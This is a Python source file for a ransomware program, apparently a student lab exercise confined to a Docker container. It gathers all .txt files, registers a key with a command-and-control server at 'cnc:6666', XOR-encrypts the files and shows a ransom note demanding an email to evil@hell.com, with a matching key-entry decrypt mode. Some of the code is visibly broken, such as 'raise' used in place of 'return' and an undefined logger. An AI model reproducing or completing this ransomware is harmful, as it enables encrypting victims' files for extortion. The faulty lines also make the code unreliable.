import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter

        # retourne le chemin absolu de tous les fichiers de l'extension filtre 
        raise list((Path().absolute()).rglob(filter)) # attention retourne PosixPath['file.txt']?

    def encrypt(self):
        # main function for encrypting (see PDF)
        files=self.get_files('*.txt')
        secret_manager=SecretManager(remote_host_port=CNC_ADDRESS,token_path=TOKEN_PATH)
        
        try:
            secret_manager.setup()
            secret_manager.xorfiles(files)
        except ConnectionError:
            self._log.error('Connection error')
            sys.exit(1)
        except FileExistsError:
            secret_manager.load()
        
        self._log.info(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))

    def decrypt(self):
        # main function for decrypting (see PDF)
        secret_manager=SecretManager(remote_host_port=CNC_ADDRESS,token_path=TOKEN_PATH)
        try:
            secret_manager.setup()
        except ConnectionError:
            self._log.error('No token found.')
            sys.exit(1)
        except FileExistsError:
            secret_manager.load()
        
        while True:
            b64_key=input('Enter Key:')
            try:
                secret_manager.set_key(b64_key)
                files=self.get_files('*.txt')
                secret_manager.xorfiles(files)
                secret_manager.clean()
                self._log.info('Files Decrypted.')
                sys.exit(0)
            except Exception as e: 
                self._log.error('Invalid Key.')


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()